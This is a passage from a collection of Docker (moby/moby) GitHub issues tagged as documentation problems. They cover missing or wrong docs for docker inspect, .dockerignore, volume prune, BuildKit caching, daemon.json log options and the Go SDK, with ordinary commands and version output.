https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.27 - docker v17.03 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.26 - docker v1.13.1 https://github.com/moby/moby/pull/40570 \r\n    - [x] v1.25 - docker v1.13.0 https://github.com/moby/moby/pull/40570 \r\n- [x] cherry-pick copy of swagger.yaml to current release branch\r\n    - [x] https://github.com/moby/moby/pull/40575 [19.03 backport] docs: add API versions v1.25 - v1.29, v1.38 - v1.40\r\n    - [x] https://github.com/moby/moby/pull/40779 [19.03 backport] docs: add API versions v1.30 - v1.37\r\n- [x] ~remove unused release-branches~ we can't update all archives, so we may want to keep the old branches (but eventually, \"archive\" the docker/docker-ce repository once it's no longer used in the build pipeline\r\n"},{"labels":[null,"documentation"],"text":"The `docker inspect` documentation doesn't describe the `Health` object being returned once healthchecks are configured.\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker run -it --rm nginx`\r\n2. _docker inspect_ the container: `docker inspect --format '{{json .State.Health }}' ` and observe `null` according to the documentation (since the field doesn't exist). \r\n3. `docker run -it --rm --health-cmd=\"exit 0\" nginx`\r\n4. _docker inspect_ the container: `docker inspect --format '{{json .State.Health }}' ` and observe a valid JSON:\r\n\r\n `{\"Status\":\"healthy\",\"FailingStreak\":0,\"Log\":[{\"Start\":\"2019-12-22T10:59:05.6385933Z\",\"End\":\"2019-12-22T10:59:05.8078452Z\",\"ExitCode\":0,\"Output\":\"\"}]}`\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           19.03.5\r\n API version:       1.40\r\n Go version:        go1.12.12\r\n Git commit:        633a0ea\r\n Built:             Wed Nov 13 07:22:34 2019\r\n OS/Arch:           darwin/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          19.03.5\r\n  API version:      1.40 (minimum version 1.12)\r\n  Go version:       go1.12.12\r\n  Git commit:       633a0ea\r\n  Built:            Wed Nov 13 07:29:19 2019\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n containerd:\r\n  Version:          v1.2.10\r\n  GitCommit:        b34a5c8af56e510852c35414db4c1f4fa6172339\r\n runc:\r\n  Version:          1.0.0-rc8+dev\r\n  GitCommit:        3e425f80a8c931f88e6d94a8c831b9d5aa481657\r\n docker-init:\r\n  Version:          0.18.0\r\n  GitCommit:        fec3683\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient:\r\n Debug Mode: false\r\n\r\nServer:\r\n Containers: 2\r\n  Running: 2\r\n  Paused: 0\r\n  Stopped: 0\r\n Images: 51\r\n Server Version: 19.03.5\r\n Storage Driver: overlay2\r\n  Backing Filesystem: extfs\r\n  Supports d_type: true\r\n  Native Overlay Diff: true\r\n Logging Driver: json-file\r\n Cgroup Driver: cgroupfs\r\n Plugins:\r\n  Volume: local\r\n  Network: bridge host ipvlan macvlan null overlay\r\n  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\n Swarm: inactive\r\n Runtimes: runc\r\n Default Runtime: runc\r\n Init Binary: docker-init\r\n containerd version: b34a5c8af56e510852c35414db4c1f4fa6172339\r\n runc version: 3e425f80a8c931f88e6d94a8c831b9d5aa481657\r\n init version: fec3683\r\n Security Options:\r\n  seccomp\r\n   Profile: default\r\n Kernel Version: 4.9.184-linuxkit\r\n Operating System: Docker Desktop\r\n OSType: linux\r\n Architecture: x86_64\r\n CPUs: 4\r\n Total Memory: 4.833GiB\r\n Name: docker-desktop\r\n ID: CBCJ:MNIU:ICXC:77PL:YXBA:K5EF:NE3L:5OHR:BIE4:TFOW:G4BB:2A2N\r\n Docker Root Dir: /var/lib/docker\r\n Debug Mode: false\r\n HTTP Proxy: gateway.docker.internal:3128\r\n HTTPS Proxy: gateway.docker.internal:3129\r\n Registry: https://index.docker.io/v1/\r\n Labels:\r\n Experimental: false\r\n Insecure Registries:\r\n  127.0.0.0/8\r\n Live Restore Enabled: false\r\n Product License: Community Engine\r\n```\r\n"},{"labels":[null,"documentation",null,null,null],"text":"The `.dockerignore` file has been around for a while, but there's still room for improvement. Opening this as a ticket, based on some notes I had, and some existing issues. I can break down this issue further (and open separate tickets where needed)\r\n\r\n#### Some related issues:\r\n\r\n- [ ] https://github.com/moby/moby/issues/40318 Verify parity between .dockerignore and .gitignore syntax\r\n- [ ] https://github.com/moby/moby/issues/30018 Exception patterns in .dockerignore do not support wildcard directories\r\n- [ ] https://github.com/moby/moby/issues/41433 wildcard directories not implemented correctly in dockerignore\r\n- [ ] https://github.com/moby/moby/issues/12843 Global .dockerignore\r\n- [ ] (re)consider nested .dockerignore files https://github.com/moby/moby/issues/20944, and https://github.com/moby/moby/pull/21020#issuecomment-210106299\r\n- [ ] https://github.com/moby/moby/issues/9294 \"Output the reason while cache need to be invalidated on docker build\"\r\n- [ ] https://github.com/moby/moby/issues/15771 COPY with excluded files is not possible\r\n\r\n#### Assorted issues / suggestions / topics\r\n\r\n- Improve performance where possible. Ignoring files should make builds smaller and _faster_, not cause builds to be slow.\r\n    - Would be great if it's possible to profile builds, and see how much time was taken by _excluding_ files. Having this would allow users to make better informed decisions wether or not `.dockerignore` is the right solution.\r\n    - The dockerignore file is often used to make the build-context smaller in order to speed up builds, but with the introduction of BuildKit, some of those may no longer be relevant (and `.dockerignore` could actually have a negative impact in some situations)\r\n- Make `.dockerignore` follow the _exact_ same patterns as `.gitignore` (which it was originally modeled after)\r\n    - `.gitignore` pattern reference: https://git-scm.com/docs/gitignore#_pattern_format\r\n    - if possible, run the .git test-suite / tests to verify this\r\n- Add a global `.dockerignore` to allow excluding common files (`.idea`, `Thumbs.db` files and such). See [moby#12843](https://github.com/moby/moby/issues/12843 Global .dockerignore)\r\n    - allow easy discovery _why_ a file or directory was ignored (which becomes more important if a global ignore file is active). Also see next bullet\r\n- Introduce a command similar to [`git check-ignore`](https://git-scm.com/docs/git-check-ignore) for debugging\r\n    - related: https://github.com/moby/moby/issues/9294 \"Output the reason while cache need to be invalidated on docker build\"\r\n- Note: recursive `.dockerignore` files were proposed at some point, but were considered a risky, breaking change (see https://github.com/moby/moby/issues/20944, and https://github.com/moby/moby/pull/21020#issuecomment-210106299)\r\n    - should this be reconsidered?\r\n- Improve and validate the [`.dockerignore` documentation](https://docs.docker.com/engine/reference/builder/#dockerignore-file)\r\n    - document the per-Dockerfile dockerignore (when using BuildKit and Docker 19.03 or up: https://github.com/moby/moby/issues/12886#issuecomment-480575928, https://github.com/moby/moby/issues/12886#issuecomment-518843764)\r\n    - improve docs by referring to / borrowing from `.gitignore` (where applicable) (see https://github.com/moby/moby/issues/40318 \"BUG: `.dockerignore` sometimes ignores `**`\")\r\n    - could be moved to a separate page if needed\r\n    - provide better examples (also for Windows platforms)\r\n    - best practices (what files to consider for excluding to optimize caching; when to use `.dockerignore`, when *not* to use and (e.g.) use BuildKit, optimize your Dockerfile, use multi-stage builds etc.)\r\n    - common pitfalls\r\n- (related) consider implementing `COPY --exclude` to allow specifying ignore-rules in the Dockerfile itself; this can help with situations where (e.g.) frequently changing files are mixed with \"cacheable\" files (proposal in https://github.com/moby/moby/issues/15771). Allowing such files to be `COPY`'d separately would give more control over layers/caching.\r\n- (Slightly related) improve errors produced due to files that were excluded. The current error for missing files is confusing (as it mentions the file path on the _daemon_ side), therefore making it hard to trace the error back to `.dockerignore` (see the discussion on https://github.com/docker/for-mac/issues/1922, and https://github.com/moby/moby/issues/37605)\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"**Description**\r\n\r\n`docker volume prune` does not remove dangling bind volumes\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n```\r\n$ docker volume create --name bind_volume --opt type=none --opt device=/tmp --opt o=bind\r\nbind_volume\r\n\r\n$ docker volume inspect bind_volume\r\n[\r\n    {\r\n        \"CreatedAt\": \"2019-10-29T17:41:09Z\",\r\n        \"Driver\": \"local\",\r\n        \"Labels\": {},\r\n        \"Mountpoint\": \"/var/lib/docker/volumes/bind_volume/_data\",\r\n        \"Name\": \"bind_volume\",\r\n        \"Options\": {\r\n            \"device\": \"/tmp\",\r\n            \"o\": \"bind\",\r\n            \"type\": \"none\"\r\n        },\r\n        \"Scope\": \"local\"\r\n    }\r\n]\r\n\r\n$ docker volume ls -f dangling=true\r\nDRIVER              VOLUME NAME\r\nlocal               bind_volume\r\n\r\n$ docker volume prune -f\r\nTotal reclaimed space: 0B\r\n```\r\n\r\n**Describe the results you received:**\r\n\r\nA dangling bind volume is not removed.\r\n\r\n**Describe the results you expected:**\r\n\r\nA dangling bind volume is removed.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nThe issue happens 100% of time.\r\n\r\n**Workaround**\r\n\r\nFeed the list of dangling volumes to `docker volume rm` manually:\r\n\r\n```\r\n$ docker volume rm $(docker volume ls -qf dangling=true)\r\nOR\r\n$ docker volume ls -qf dangling=true | xargs -r docker volume rm\r\n```\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n$ docker version\r\nClient:\r\n Version:           18.09.2\r\n API version:       1.39\r\n Go version:        go1.10.6\r\n Git commit:        6247962\r\n Built:             Sun Feb 10 04:13:47 2019\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          18.09.2\r\n  API version:      1.39 (minimum version 1.12)\r\n  Go version:       go1.10.6\r\n  Git commit:       6247962\r\n  Built:            Sun Feb 10 03:42:13 2019\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n$ docker info\r\nContainers: 152\r\n Running: 16\r\n Paused: 0\r\n Stopped: 136\r\nImages: 80\r\nServer Version: 18.09.2\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\nSwarm: active\r\n NodeID: x9jkazxqv6noz8od01g8gzm0h\r\n Is Manager: true\r\n ClusterID: uxkuiv5ijmosd54chjohkfoqe\r\n Managers: 1\r\n Nodes: 1\r\n Default Address Pool: 10.0.0.0/8  \r\n SubnetSize: 24\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 10\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.64.1\r\n Manager Addresses:\r\n  192.168.64.1:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: bb71b10fd8f58240ca47fbb579b9d1028eea7c84\r\nrunc version: 2b18fe1d885ee5083ef9f0838fee39b62d653e30\r\ninit version: fec3683\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.15.0-1021-aws\r\nOperating System: Ubuntu 18.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.48GiB\r\nName: ip-172-31-5-235\r\nID: ZG4Q:UHEI:5G7S:6H6I:A22K:YZZX:JUER:TASL:HXB3:CZKZ:WOHK:BDYB\r\nDocker Root Dir: /data/var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\nProduct License: Community Engine\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nTested with docker 18.09.2 and 19.03.4"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**A mistake in the moby/image/spec/v1.md **\r\n\r\n**Steps to reproduce the issue:**\r\nIt looks like that titles below were swapped in the doc file moby/image/spec/v1.md :\r\n\r\n**Entrypoint array of strings**\r\nA list of arguments to use as the command to execute when the container starts. This value acts as a default and is replaced by an entrypoint specified when creating a container.\r\n\r\n**Cmd array of strings**\r\nDefault arguments to the entry point of the container. These values act as defaults and are replaced with any specified when creating a container. If an Entrypoint value is not specified, then the first entry of the Cmd array should be interpreted as the executable to run.\r\n\r\n**Describe the results you received:\r\n\r\n**\r\n\r\n**Describe the results you expected:\r\n\r\n**\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n(paste your output here)\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n(paste your output here)\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**"},{"labels":["documentation",null],"text":"The SDK is very unfriendly for beginners.\r\n\r\nApart from the fact every program imports `docker/docker` (including `docker-ce` and `kubernetes`) and that redirects to `moby/moby` on the website, the default version you get from go is `v1.13.1` and people just seem to import specific commits. The releases can not be seen on `moby/moby` but can be found on `docker/engine` however you can not import specific version from there, since other dependencies will crash. \r\n\r\nEven the documentation on the website does not work. This is from https://docs.docker.com/develop/sdk/examples/:\r\n```\r\n\tstatusCh, errCh := cli.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)\r\n\tselect {\r\n\tcase err := <-errCh:\r\n\t\tif err != nil {\r\n\t\t\tpanic(err)\r\n\t\t}\r\n\tcase <-statusCh:\r\n\t}\r\n```\r\n`cli.ContainerWait` does not return chans, it returns `(int64, error)` on v1.13.1, and the website does not say how to get other versions of the SDK. Even the documentation on `godoc.org` is wrong since it tells you to get `import \"github.com/docker/docker/client\"` and that will get you `v1.13.1`, which does not return `(<-chan container.ContainerWaitOKBody, <-chan error)` as specified in the documentation.\r\n\r\nAre there any plans to offer some proper documentation and releases so that people can actually use the SDK, without having to dig from git?"},{"labels":["documentation"],"text":"I thought someone forgot to update the docs, but it looks like this might be done on purpose. If this is the former case, I can make a quick PR. However if its the latter, I hope someone will be able to fill me in why this is done this way.\r\n\r\nhttps://github.com/moby/moby/blob/0243936d92ea57f48c6a32beac797ee3b388ba28/api/swagger.yaml#L2246-L2251\r\n\r\nhttps://github.com/moby/moby/blob/be97c66708c24727836a22247319ff2943d91a03/daemon/names/names.go#L5-L9"},{"labels":[null,"documentation",null,null],"text":"When building with `BuildKit`, the `--no-cache` option is (partially) ignored;\r\n\r\nBuild a Dockerfile;\r\n\r\n```bash\r\nDOCKER_BUILDKIT=1 docker build -t bla https://github.com/thaJeztah/go-top.git\r\n[+] Building 29.1s (8/8) FINISHED                                                                                                                                                                                          \r\n => [internal] load git source https://github.com/thaJeztah/go-top.git                                                                                                                                                1.3s\r\n => [internal] load metadata for docker.io/library/golang:1.10-alpine                                                                                                                                                 2.3s\r\n => CACHED [internal] helper image for file operations                                                                                                                                                                0.0s\r\n => [build 1/3] FROM docker.io/library/golang:1.10-alpine@sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b                                                                                    17.9s\r\n => => resolve docker.io/library/golang:1.10-alpine@sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b                                                                                           0.0s\r\n => => sha256:d830d821f1ea39178886c4853e25ec07369f037cb758e07c3cbab832eabc9a14 1.36kB / 1.36kB                                                                                                                        0.0s\r\n => => sha256:2f577258bd101df535742773fc8d03fe9ea0350e8e132ab55da7dbbc508c89f2 3.80kB / 3.80kB                                                                                                                        0.0s\r\n => => sha256:2d13b02809266f700fe9d5a5002b4b8731fd5c8ff9218240bdc69005e678b158 78.11MB / 78.11MB                                                                                                                     14.3s\r\n => => sha256:0934a9e519360feba9d140548eebdab7cab66c55d04de2bde94a3dffa79a1122 125B / 125B                                                                                                                            1.1s\r\n => => sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b 2.04kB / 2.04kB                                                                                                                        0.0s\r\n => => extracting sha256:2d13b02809266f700fe9d5a5002b4b8731fd5c8ff9218240bdc69005e678b158                                                                                                                             2.6s\r\n => => extracting sha256:0934a9e519360feba9d140548eebdab7cab66c55d04de2bde94a3dffa79a1122                                                                                                                             0.0s\r\n => [build 2/3] COPY . .                                                                                                                                                                                              1.6s\r\n => [build 3/3] RUN go install -v ./...                                                                                                                                                                               3.1s\r\n => [stage-1 1/1] COPY --from=build /go/bin/go-top /                                                                                                                                                                  2.7s\r\n => exporting to image                                                                                                                                                                                                0.0s\r\n => => exporting layers                                                                                                                                                                                               0.0s\r\n => => writing image sha256:e7320ea8c5feabd7e31e4f084fd69f52a4a44325caee01beedd6a0d7f004c198                                                                                                                          0.0s\r\n => => naming to docker.io/library/bla                                                                                                                                                                                0.0s\r\n```\r\n\r\nBuild the same image again, but this time with `--no-cache`;\r\n\r\n```bash\r\nDOCKER_BUILDKIT=1 docker build -t bla --no-cache https://github.com/thaJeztah/go-top.git\r\n[+] Building 7.9s (8/8) FINISHED                                                                                                                                                                                           \r\n => CACHED [internal] load git source https://github.com/thaJeztah/go-top.git                                                                                                                                         0.0s\r\n => [internal] load metadata for docker.io/library/golang:1.10-alpine                                                                                                                                                 0.9s\r\n => CACHED [build 1/3] FROM docker.io/library/golang:1.10-alpine@sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b                                                                              0.0s\r\n => CACHED [internal] helper image for file operations                                                                                                                                                                0.0s\r\n => [build 2/3] COPY . .                                                                                                                                                                                              1.4s\r\n => [build 3/3] RUN go install -v ./...                                                                                                                                                                               2.7s\r\n => [stage-1 1/1] COPY --from=build /go/bin/go-top /                                                                                                                                                                  2.7s\r\n => exporting to image                                                                                                                                                                                                0.0s\r\n => => exporting layers                                                                                                                                                                                               0.0s\r\n => => writing image sha256:8a8b64198a7f7da426fd5783ae0b0d8958cd154424a060ca2b37a4a17ec0510c                                                                                                                          0.0s\r\n => => naming to docker.io/library/bla                                                                                                                                                                                0.0s\r\n```\r\n\r\nNotice that various steps show `CACHED`\r\n\r\n\r\n\r\nReproduced on Docker 18.09.0;\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           18.09.0\r\n API version:       1.39\r\n Go version:        go1.10.4\r\n Git commit:        4d60db4\r\n Built:             Wed Nov  7 00:47:43 2018\r\n OS/Arch:           darwin/amd64\r\n Experimental:      true\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          18.09.0\r\n  API version:      1.39 (minimum version 1.12)\r\n  Go version:       go1.10.4\r\n  Git commit:       4d60db4\r\n  Built:            Wed Nov  7 00:55:00 2018\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     true\r\n```"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\ndockerd start failed when daemon config with some log driver options\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1.install docker-ce (17.03 up to latest version) on ubuntu 16.04 LTS\r\n2.config the `/etc/docker/daemon.json` as following:\r\n```\r\n{\r\n  \"log-driver\": \"json-file\",\r\n  \"log-opts\": {\r\n    \"max-size\": \"10m\"\r\n  }\r\n}\r\n```\r\n3.restart dockerd by `sudo service docker restart`, and it works\r\n4.if change `/etc/docker/daemon.json` to:\r\n```\r\n{\r\n  \"log-driver\": \"json-file\",\r\n  \"log-opts\": {\r\n    \"max-size\": \"10m\",\r\n    \"max-file\": 3\r\n  }\r\n}\r\n```\r\nrestart dockerd will get error:\r\n```\r\n-- Subject: Unit docker.socket has begun start-up\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.socket has begun starting up.\r\nNov 21 15:55:58 ubuntu systemd[1]: Listening on Docker Socket for the API.\r\n-- Subject: Unit docker.socket has finished start-up\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.socket has finished starting up.\r\n--\r\n-- The start-up result is done.\r\nNov 21 15:55:58 ubuntu systemd[1]: Starting Docker Application Container Engine...\r\n-- Subject: Unit docker.service has begun start-up\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.service has begun starting up.\r\nNov 21 15:55:58 ubuntu dockerd[16761]: unable to configure the Docker daemon with file /etc/docker/daemon.json\r\nNov 21 15:55:58 ubuntu systemd[1]: docker.service: Main process exited, code=exited, status=1/FAILURE\r\nNov 21 15:55:58 ubuntu systemd[1]: Failed to start Docker Application Container Engine.\r\n-- Subject: Unit docker.service has failed\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.service has failed.\r\n--\r\n-- The result is failed.\r\nNov 21 15:55:58 ubuntu systemd[1]: docker.service: Unit entered failed state.\r\nNov 21 15:55:58 ubuntu systemd[1]: docker.service: Failed with result 'exit-code'.\r\nNov 21 15:55:58 ubuntu sudo[16726]: pam_unix(sudo:session): session closed for user root\r\nNov 21 15:58:35 ubuntu sudo[16769]:   shaoan : TTY=pts/0 ; PWD=/home/shaoan ; USER=root ; COMMAND=/usr/bin/vi\r\nNov 21 15:58:35 ubuntu sudo[16769]: pam_unix(sudo:session): session opened for user root by shaoan(uid=0)\r\nNov 21 16:01:39 ubuntu sudo[16769]: pam_unix(sudo:session): session closed for user root\r\n```\r\n\r\n\r\nIs the parameter `max-file` not supported in in `daemon.json` config? or a bug with docker daemon?\r\n\r\n"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go through the [doc](https://github.com/moby/moby/blob/master/docs/contributing/test.md#run-unit-tests)\r\n\r\n\r\n**Describe the results you received:**\r\nAfter issuing:\r\n```\r\n$ TESTDIRS='opts' TESTFLAGS='-test.run ^TestValidateIPAddress$' make test-unit\r\n```\r\nfrom the test documents, I got:\r\n```\r\ncan't load package: package opts: cannot find package \"opts\" in any of:\r\n        /usr/local/go/src/opts (from $GOROOT)\r\n        /go/src/opts (from $GOPATH)\r\nmake: *** [Makefile:161: test-unit] Error 1\r\n```\r\n\r\n**Describe the results you expected:**\r\nHowever I managed to get it to work with:\r\n```\r\n$ TESTDIRS='github.com/docker/docker/opts' TESTFLAGS='-test.run $^TestValidateIPAddress$' make test-unit\r\n```\r\nNote the full path `github.com/docker/docker/opts`. Which is expected since\r\n```\r\n    go test \"${BUILDFLAGS[@]}\" \\\r\n        -cover \\\r\n        -coverprofile=profile.out \\\r\n        -covermode=atomic \\\r\n        $TESTFLAGS \\\r\n        \"${pkg}\"\r\n```\r\nfrom `hack/test/unit` should probably not be issuing `go test opts`.\r\nThis resulted in:\r\n```\r\nok      github.com/docker/docker/opts   0.028s  coverage: 0.0% of statements [no tests to run]                                                                           \r\n```\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:           18.06.1-ce\r\n API version:       1.38\r\n Go version:        go1.11\r\n Git commit:        e68fc7a215\r\n Built:             Fri Sep  7 11:26:59 2018\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer:\r\n Engine:\r\n  Version:          18.06.1-ce\r\n  API version:      1.38 (minimum version 1.12)\r\n  Go version:       go1.11\r\n  Git commit:       e68fc7a215\r\n  Built:            Fri Sep  7 11:26:11 2018\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 1\r\n Running: 1\r\n Paused: 0\r\n Stopped: 0\r\nImages: 83\r\nServer Version: 18.06.1-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: false\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 468a545b9edcd5932818eb9de8e72413e616e86e\r\nrunc version: 69663f0bd4b60df09991c08812a60108003fa340\r\ninit version: fec3683\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.14.70-1-lts\r\nOperating System: Arch Linux\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 7.679GiB\r\nName: colonelthink\r\nID: J6N7:37O7:PQEO:VI7Y:NQAQ:JFJ5:77WR:FFF7:7CF7:MUIC:MZF2:ZVTZ\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"There are a HostConfig.DiskQuota option with description \"Disk limit (in bytes).\" on https://docs.docker.com/engine/api/v1.37/#operation/ContainerCreate.\r\n\r\nBut, unfortunately, I can't find any other information about what does it mean. What constrains of use does it have? Is it can be used on all platfroms/storage drivers? What would be if this limit will be exceeded?"},{"labels":[null,"documentation"],"text":"https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#using-pipes\r\n\r\nI think this should mention \r\n\r\n    SHELL [\"/bin/bash\", 